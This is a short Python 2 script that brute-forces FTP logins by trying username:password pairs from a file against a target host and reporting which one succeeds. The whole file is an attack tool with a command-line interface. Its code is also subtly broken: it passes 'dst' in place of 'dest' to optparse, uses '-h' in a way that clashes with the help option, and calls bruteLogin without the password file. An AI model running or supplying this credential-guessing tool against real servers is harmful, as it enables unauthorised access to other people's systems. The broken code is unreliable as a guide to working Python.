import ftplib
import optparse


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF:
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print "[+] Trying: " + username + "/" + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print '\n[*] ' + str(hostname) + ' FTP Logon Succeeded with ' + username + "/" + password
            ftp.quit()
            return True
        except Exception, e:
            print '\n[-] ' + str(hostname) + ' FTP Logon Failed'


def main():
    parse = optparse.OptionParser('usage%prog -h <hostname> -p <passwdFile>')
    parse.add_option('-h', dst='hostname', type='string', help='specify a hostname')
    parse.add_option('-p', dst='passwdFile', type='string', help='specify a password file')
    (options, args) = parse.parse_args()
    hostname = options.hostname
    bruteLogin(hostname)


if __name__ == '__main__':
    main()
